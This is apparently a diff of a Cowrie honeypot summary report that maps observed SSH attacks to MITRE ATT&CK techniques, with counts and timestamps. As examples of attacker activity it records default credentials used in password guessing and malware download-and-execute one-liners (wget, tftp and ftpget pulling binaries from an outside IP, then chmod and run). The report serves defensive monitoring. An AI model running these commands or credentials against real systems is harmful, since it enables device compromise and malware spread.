@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-12 08:03:44",
+  "generated": "2026-09-12 09:02:11",
   "totals": {
-    "commands": 259,
-    "login_failed": 1284,
-    "login_success": 72,
-    "sessions": 1455
+    "commands": 290,
+    "login_failed": 1331,
+    "login_success": 74,
+    "sessions": 1584
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 1284,
+      "count": 1331,
       "examples": [
         "admin / 150580",
         "admin / 150488",
@@ -21,14 +21,14 @@
         "root / casa"
       ],
       "first": "2026-09-12T00:01:39.148725Z",
-      "last": "2026-09-12T08:02:37.051560Z",
-      "unique_ips": 36
+      "last": "2026-09-12T08:55:37.548633Z",
+      "unique_ips": 42
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 72,
+      "count": 74,
       "examples": [
         "root / root",
         "root / xmhdipc",
@@ -37,30 +37,14 @@
         "root / 123@@@"
       ],
       "first": "2026-09-12T00:08:14.272082Z",
-      "last": "2026-09-12T07:40:07.750520Z",
-      "unique_ips": 25
-    },
-    {
-      "id": "T1105",
-      "name": "Ingress Tool Transfer",
-      "tactic": "Command and Control",
-      "count": 20,
-      "examples": [
-        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
-        "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
-        "(ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f",
-        "if ! command -v curl &> /dev/null; then apt-get update -y && apt-get install -y curl || yum install -y curl; fi",
-        "bash <(curl -sL https://raw.githubusercontent.com/komari-monitor/komari-agent/refs/heads/main/install.sh) -e https://sex"
-      ],
-      "first": "2026-09-12T00:08:18.733876Z",
-      "last": "2026-09-12T06:38:29.448025Z",
-      "unique_ips": 5
+      "last": "2026-09-12T08:43:38.850161Z",
+      "unique_ips": 27
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 18,
+      "count": 33,
       "examples": [
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
         ">/var/d && chmod 777 /var/d && /var/d && cd /var/",
@@ -69,8 +53,24 @@
         ">/dev/d && chmod 777 /dev/d && /dev/d && cd /dev/"
       ],
       "first": "2026-09-12T00:08:17.167446Z",
-      "last": "2026-09-12T07:22:19.556519Z",
-      "unique_ips": 4
+      "last": "2026-09-12T08:44:34.548830Z",
+      "unique_ips": 5
+    },
+    {
+      "id": "T1105",
+      "name": "Ingress Tool Transfer",
+      "tactic": "Command and Control",
+      "count": 23,
+      "examples": [
+        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
+        "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
+        "(ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f",
+        "if ! command -v curl &> /dev/null; then apt-get update -y && apt-get install -y curl || yum install -y curl; fi",
+        "bash <(curl -sL https://raw.githubusercontent.com/komari-monitor/komari-agent/refs/heads/main/install.sh) -e https://sex"
+      ],
+      "first": "2026-09-12T00:08:18.733876Z",
+      "last": "2026-09-12T08:44:34.548830Z",
+      "unique_ips": 6
     },
     {
       "id": "T1083",
@@ -114,15 +114,15 @@
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 4,
+      "count": 5,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
         "id"
       ],
       "first": "2026-09-12T00:08:18.733876Z",
-      "last": "2026-09-12T07:22:19.556519Z",
-      "unique_ips": 4
+      "last": "2026-09-12T08:43:43.172988Z",
+      "unique_ips": 5
     },
     {
       "id": "T1059.004",
@@ -164,15 +164,19 @@
   "unmapped": [
     [
       "shell",
-      51
+      52
     ],
     [
       "sh",
-      51
+      52
     ],
     [
       "system",
-      34
+      35
+    ],
+    [
+      "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
+      16
     ],
     [
       "/bin/busybox LZRD",
@@ -183,12 +187,8 @@
       10
     ],
     [
-      "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
-      8
-    ],
-    [
       "enable",
-      4
+      5
     ],
     [
       "/bin/busybox",
@@ -196,14 +196,18 @@
     ],
     [
       "linuxshell",
-      2
+      3
     ],
     [
       "ping ;sh",
-      2
+      3
     ],
     [
       "cd /proc && cat self/cmdline",
+      3
+    ],
+    [
+      "enablelinuxshell",
       2
     ],
     [
@@ -217,10 +221,6 @@
     [
       "rm /tmp/bendi.py",
       2
-    ],
-    [
-      "enablelinuxshell",
-      1
     ],
     [
       "/bin/busybox hostname PBOC",
